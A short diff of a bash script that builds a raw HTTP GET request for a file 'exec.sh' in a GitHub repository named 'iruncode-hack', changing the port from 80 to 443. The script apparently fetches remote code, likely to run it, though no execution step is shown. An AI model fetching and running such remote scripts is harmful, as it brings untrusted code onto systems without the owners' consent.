@@ -1,7 +1,7 @@
 #!/bin/bash
 
 host="github.com"
-port="80"
+port="443"
 path="/d0m-1k/iruncode-hack/raw/refs/heads/main/exec.sh"
 
 request="GET $path HTTP/1.1
